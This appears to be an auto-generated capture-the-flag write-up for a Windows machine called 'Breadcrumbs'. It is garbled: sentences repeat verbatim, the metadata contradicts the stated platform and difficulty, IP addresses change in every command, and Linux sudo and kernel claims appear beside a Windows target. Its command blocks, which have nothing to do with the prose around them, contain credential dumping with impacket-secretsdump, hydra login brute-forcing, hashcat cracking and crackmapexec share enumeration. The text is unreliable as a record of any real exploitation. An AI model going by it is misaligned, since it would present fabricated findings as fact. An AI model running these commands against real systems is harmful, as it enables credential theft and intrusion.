---
TitleSEO: "VulnHub — Breadcrumbs (Easy Windows) | ZureFX"
TitlePost: "VulnHub — Breadcrumbs (Easy Windows)"
Author: "ZureFX"
Description: "Full writeup for VulnHub Breadcrumbs. IDOR and Weak Service Permissions to achieve easy compromise on Windows."
Keywords: "active directory, linux, insane, medium, pwntilldawn, web, ctf"
URL: "https://zurefx.github.io/writeups/htb-breadcrumbs-742.html"
URL_IMAGES: "https://raw.githubusercontent.com/zurefx/images/refs/heads/main/writeups/htb-breadcrumbs-742/"
Date: "2026-01-26"
Tags: "Active Directory, Linux, Insane, Medium, PwnTillDawn, Web, CTF"
Section: "writeups"
Lang: "en"
main_img: "htb-breadcrumbs-742"
Permalink: "/writeups/htb-breadcrumbs-742.html"
BtnLabel: "Read Writeup"
Pick: 0
---
## Machine Info

### Overview

The target **Breadcrumbs** is rated **Easy** on VulnHub. It runs **Windows** and the IP address during this analysis was `10.32.179.155`.

### Objectives

Weak file permissions allowed modification of critical system files. Weak file permissions allowed modification of critical system files.

## Enumeration

### Port Scanning

Starting with a full port scan to identify the attack surface.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.84.148.159
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.107.7.115/FUZZ
```

Initial enumeration revealed several interesting open ports on the target. The service account had excessive permissions assigned in Active Directory.

### Service Enumeration

The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

```bash
gobuster dir -u http://10.111.168.205/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

Unconstrained delegation was enabled on the compromised machine. Post-exploitation enumeration revealed a path to domain administrator privileges.

### Web Enumeration

Post-exploitation enumeration revealed a path to domain administrator privileges. The target system was identified as running a vulnerable version of the service.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.99.15.188/FUZZ
nmap -sCV -p9200,135,135 10.108.231.159 -oN scan.txt
impacket-secretsdump administrator:'P@ssw0rd!'@10.32.141.7
```

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine. The scheduled task ran with elevated privileges and could be abused for escalation.

## Exploitation

### Vulnerability Identification

The service account had excessive permissions assigned in Active Directory. The service account had excessive permissions assigned in Active Directory. Weak file permissions allowed modification of critical system files.

Key finding: **IDOR**.

Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory.

### Initial Access

The service account had excessive permissions assigned in Active Directory. Network traffic analysis revealed unencrypted communications containing user credentials.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.69.236.88
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.84.7.183 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

The service was running without proper input validation, leading to injection vulnerabilities. The database credentials were hardcoded in the application source code. The kernel version was outdated and vulnerable to a publicly known exploit.

## Privilege Escalation

### Enumeration

Privilege escalation was possible due to misconfigured sudo permissions. The database credentials were hardcoded in the application source code. Command injection was possible through unsanitized user input in the search functionality.

```powershell
gobuster dir -u http://10.24.249.175/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Exploitation

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

```powershell
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.235.120 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
feroxbuster -h
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.118.88.129 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
crackmapexec smb 10.128.46.235 -u administrator -p 'P@ssw0rd!' --shares
```

The target system was identified as running a vulnerable version of the service. Network traffic analysis revealed unencrypted communications containing user credentials.

### Root/SYSTEM

Successfully obtained **SYSTEM** access on the target.

The service was running without proper input validation, leading to injection vulnerabilities. Initial enumeration revealed several interesting open ports on the target.

## Summary

### Tools Used

- `wmiexec`
- `bloodhound`
- `gobuster`
- `msfvenom`
- `GetNPUsers`

### Key Takeaways

- IDOR
- Weak Service Permissions
- Open Redirect
